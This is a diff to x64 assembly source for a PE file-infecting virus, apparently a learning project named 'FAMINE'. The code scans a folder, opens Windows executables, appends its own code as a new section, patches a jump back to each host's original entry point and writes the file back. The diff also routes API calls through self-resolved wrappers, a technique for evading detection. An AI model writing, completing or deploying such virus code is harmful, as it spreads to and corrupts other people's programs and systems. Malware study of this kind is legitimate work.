@@ -18,12 +18,13 @@ extrn WriteFile:proc
 extrn GetProcessHeap:proc
 extrn HeapAlloc:proc
 extrn GetModuleFileNameA:proc
+public label_avant_jump
 
 .code
 
 ; rbp
-; 40-48 : alignment
-; 32-40 : av[0]
+; 224-232 : padding
+; 32-224 : av[0] buffer
 ; 00-32 : shadow space
 ; rsp
 
@@ -50,20 +51,28 @@ main proc
 		push R14
 		push R15
 
-		sub	rsp, 48
+		sub rsp, 232
 		or rsp, 0fh
 		inc rsp
 		sub rsp, 010h
 
-		mov rcx, [rdx]
-		mov [rsp + 32], rcx
+		mov rcx, 0
+		lea rdx, [rsp + 32]
+		mov r8, 192
 
-		test BYTE ptr [MUST_EXIT], 1
-		jne	not_nt_create_file
-		call proc_nt_create_file ; Si must exit = 0
 
-		not_nt_create_file:
-	 	call CreateFileA
+;		test BYTE ptr [MUST_EXIT], 1
+;		jne	not_nt_get_module_file_name_debut_main
+;		call proc_nt_get_module_file_name ; Si must exit = 0
+;not_nt_get_module_file_name_debut_main:
+;		call GetModuleFileNameA
+		
+;		lea rcx, [rsp + 32]
+;		test BYTE ptr [MUST_EXIT], 1
+;		jne	not_nt_create_file
+;		call proc_nt_create_file ; Si must exit = 0
+;		not_nt_create_file:
+;	 	call CreateFileA
 
 		lea rcx, TMP_1
 		call infect_folder
@@ -71,7 +80,7 @@ main proc
 		mov rcx, label_debut
 		sub rdx, rcx
 
-		add rsp, 48
+		add rsp, 232
 
 		pop R15
 		pop R14
@@ -91,11 +100,12 @@ main proc
 		cmp BYTE ptr [MUST_EXIT], 1
 		je stop
 
+
+		mov rsp, rbp
 		pop rbp
-		call get_rip
-		sub rax, 90h
-		sub rax, qword ptr [ENTRY_POINT]
-		jmp rax
+label_avant_jump::
+		;db 0ffh, 25h, 00h, 00h, 00h, 00h
+		jmp label_fin
 
 stop:
 		xor rax, rax
@@ -113,6 +123,8 @@ TMP_1 db 'C:\Users\moi\AppData\Local\Temp\test\*',0h
 TMP_1_NAME db 'C:\Users\moi\AppData\Local\Temp\test\',0h
 SECTION_NAME db '.FAMINE',0
 ; rbp
+; 88 - 96   : padding
+; 80 - 88	: saved address of entry point
 ; 72 - 80   : saved r10
 ; 64 - 72   : saved rdi
 ; 60 - 64	: size_of_main 
@@ -133,7 +145,7 @@ SECTION_NAME db '.FAMINE',0
 handle_file proc ; int handle
 	push rbp
 	mov rbp, rsp
-	sub rsp, 80
+	sub rsp, 96
 
 	mov qword ptr [rsp + 64], rdi
 
@@ -141,7 +153,14 @@ handle_file proc ; int handle
 	mov r12, rcx
 	mov rcx, r12
 	mov rdx, 0 
-	call GetFileSize
+
+	test BYTE ptr [MUST_EXIT], 1
+	jne	not_nt_get_file_size
+	call proc_nt_get_file_size
+	jmp end_get_file_size
+not_nt_get_file_size:
+		call GetFileSize
+end_get_file_size:
 
 	mov r13, rax ; r13 = taille du fichier
 
@@ -154,12 +173,25 @@ handle_file proc ; int handle
 	add rcx, rax
 	mov rdi, rcx ; rdi = taille a creer
 
-	call GetProcessHeap
+	test BYTE ptr [MUST_EXIT], 1
+	jne	not_nt_get_process_heap
+	call proc_nt_get_process_heap
+	jmp end_get_process_heap
+not_nt_get_process_heap:
+		call GetProcessHeap
+end_get_process_heap:
 
 	mov rcx, rax
 	mov rdx, 0
 	mov r8, rdi
-	call HeapAlloc
+
+	test BYTE ptr [MUST_EXIT], 1
+	jne	not_nt_heap_alloc
+	call proc_nt_heap_alloc
+	jmp end_heap_alloc
+not_nt_heap_alloc:
+		call HeapAlloc
+end_heap_alloc:
 
 	mov [rsp + 40], rax
 	mov word ptr [rax], 5a4dh
@@ -172,7 +204,14 @@ handle_file proc ; int handle
 	mov r8, r13
 	lea r9, [rsp + 48]
 	mov qword ptr [rsp + 32], 0
-	call ReadFile
+
+	test BYTE ptr [MUST_EXIT], 1
+	jne	not_nt_read_file
+	call proc_nt_read_file
+	jmp end_read_file
+not_nt_read_file:
+		call ReadFile
+end_read_file:
 
 	test rax, rax
 	je ret_failure
@@ -281,9 +320,9 @@ handle_file proc ; int handle
 	xor rbx, rbx
 	mov ebx, dword ptr [r15]
 	inc rcx
-	sub r10, rbx
-	mov rbx, r10
 	mov qword ptr [rcx], rbx ; On remplace deadbeef par l'entry point
+
+	mov qword ptr [rsp + 80], rbx
 
 	mov r10, qword ptr [rsp + 72]
 
@@ -325,16 +364,37 @@ debut_boucle_ecriture_dans_jump:
 	inc rcx
 	cmp rcx, 10
 	jne debut_boucle_ecriture_dans_jump
+	
+	lea rdx, label_debut
 
+	lea rbx, label_avant_jump
+	add rbx, 5
+	sub rbx, rdx
+	add ebx, r10d
 
+	mov rcx, qword ptr [rsp + 80]
+	sub ecx, ebx
 
+	lea rax, label_avant_jump
+	add rax, 1
+	sub rax, rdx
+	add rax, qword ptr [rsp + 40]
+	add rax, r13
 
+	mov dword ptr [rax], ecx
 
 	mov rcx, r12
 	mov rdx, 0
 	mov r8, 0
 	mov r9, 0
-	call SetFilePointer
+
+	test BYTE ptr [MUST_EXIT], 1
+	jne	not_nt_set_file_pointer
+	call proc_nt_set_file_pointer
+	jmp end_set_file_pointer
+not_nt_set_file_pointer:
+		call SetFilePointer
+end_set_file_pointer:
 
 	mov rcx, r12
 	mov rdx, [rsp + 40]
@@ -342,7 +402,14 @@ debut_boucle_ecriture_dans_jump:
 	add r8, r14
 	lea r9, [rsp + 56]
 	mov qword ptr [rsp + 32], 0
-	call WriteFile
+
+	test BYTE ptr [MUST_EXIT], 1
+	jne	not_nt_write_file
+	call proc_nt_write_file
+	jmp end_write_file
+not_nt_write_file:
+		call WriteFile
+end_write_file:
 
 	mov rcx, [rsp + 40]
 	mov rdx, 0
@@ -358,7 +425,14 @@ debut_boucle_ecriture_dans_jump:
 	mov r8, rbx
 	lea r9, [rsp + 56]
 	mov qword ptr [rsp + 32], 0
-	call WriteFile
+
+	test BYTE ptr [MUST_EXIT], 1
+	jne	not_nt_write_file_2
+	call proc_nt_write_file
+	jmp end_write_file_2
+not_nt_write_file_2:
+		call WriteFile
+end_write_file_2:
 
 ret_failure:
 	mov rdi, qword ptr [rsp + 64]
@@ -391,7 +465,14 @@ open_file proc ; char *file_path - return fd or 0
 	mov [rsp + 36], rax ; flag normal
 	mov rax, 0
 	mov [rsp + 40], rax ; no attribute template
-	call CreateFileA
+
+	test BYTE ptr [MUST_EXIT], 1
+	jne	not_nt_create_file
+	call proc_nt_create_file
+	jmp end_create_file
+not_nt_create_file:
+		call CreateFileA
+end_create_file:
 	
 	mov r12, rax
 
@@ -405,7 +486,14 @@ open_file proc ; char *file_path - return fd or 0
 	lea r9, [rsp + 66]
 	mov rax, 0
 	mov [rsp + 32], rax ; Open only if exists
-	call ReadFile
+
+	test BYTE ptr [MUST_EXIT], 1
+	jne	not_nt_read_file
+	call proc_nt_read_file
+	jmp end_read_file
+not_nt_read_file:
+		call ReadFile
+end_read_file:
 
 	mov ax, word ptr [rsp + 64]
 	cmp ax, 5a4dh
@@ -436,13 +524,27 @@ infect_folder proc ; parametres : char *folder_name
 
 		mov rcx, [rsp + 32]
 		lea rdx, [rsp + 40]
+
+		test BYTE ptr [MUST_EXIT], 1
+		jne	not_nt_find_first_file
+		call proc_nt_find_first_file_a
+		jmp end_find_first_file
+not_nt_find_first_file:
 		call FindFirstFileA
+end_find_first_file:
 
 		mov rsi, rax
 loop_start:
 		mov rcx, rsi
 		lea rdx, [rsp + 40]
+
+		test BYTE ptr [MUST_EXIT], 1
+		jne	not_nt_find_next_file
+		call proc_nt_find_next_file_a
+		jmp end_find_next_file
+not_nt_find_next_file:
 		call FindNextFileA
+end_find_next_file:
 
 		cmp rax, 0
 		je loop_end
@@ -844,7 +946,7 @@ debut_boucle_remplir_la_ft:
 	jmp debut_boucle_remplir_la_ft
 fin_boucle_remplir_la_ft:
 
-	sub rax, 72
+	sub rax, 80
 
 
 	add rax, qword ptr [rsp + 64]
